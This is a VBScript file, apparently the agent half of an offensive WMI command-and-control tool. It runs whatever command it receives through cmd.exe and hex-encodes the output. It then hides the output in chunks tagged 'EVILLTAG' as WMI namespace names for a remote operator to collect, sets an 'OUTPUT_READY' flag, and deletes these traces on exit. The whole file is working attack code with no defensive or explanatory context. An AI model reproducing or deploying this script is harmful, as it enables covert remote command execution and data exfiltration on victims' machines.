function hexEn(str)
	dim strEncoded, i
	strEncoded = ""
	for i = 1 to Len(str)
		strEncoded = strEncoded + "_" + Hex(Asc(Mid(str, i, 1)))
	next
	hexEn = strEncoded
End function
Function parseCmdOutput(cmdOutput)
	strLen = Len(cmdOutput)
	pieceLen = 2500
	nbOfPieces = Int(strLen/pieceLen)
	For i = 1 to nbOfPieces
		piece = Left(cmdOutput,pieceLen)
		piece = "        " + piece + "        "
		cmdOutput = Mid(cmdOutput,pieceLen+1)
		insertPiece i,piece
	Next
	cmdOutput = "        " + cmdOutput + "        "
	insertPiece nbOfPieces+1,cmdOutput		
End Function
function insertPiece(ByVal number,ByVal piece)
	count = CStr(number)
	zeros = String(6 - Len(count), "0")
	tag = "EVILLTAG" + zeros + count
	piece = hexEn(piece)
	piece = tag + piece	
	Set aShell = CreateObject("WScript.Shell")
	aShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace CREATE Name='" + piece + "'")
        WScript.Sleep 50
End function
Set myShell = CreateObject("WScript.Shell")
tmpDir = myShell.ExpandEnvironmentStrings("%TEMP%")
Select Case WScript.Arguments.Item(0)
    Case "exit"
	myShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name like 'OUTPUT_READY'"" delete")
	myShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name like '%EVILLTAG%'"" delete")
    Case Else
	myShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name like 'OUTPUT_READY'"" delete")
	myShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name like '%EVILLTAG%'"" delete")
	set cmdExecution = myShell.exec("%comspec% /c " + WScript.Arguments.Item(0)) 
	cmdOutput = cmdExecution.StdOut.ReadAll 
	parseCmdOutput cmdOutput 
	myShell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace CREATE Name='OUTPUT_READY'")
End Select
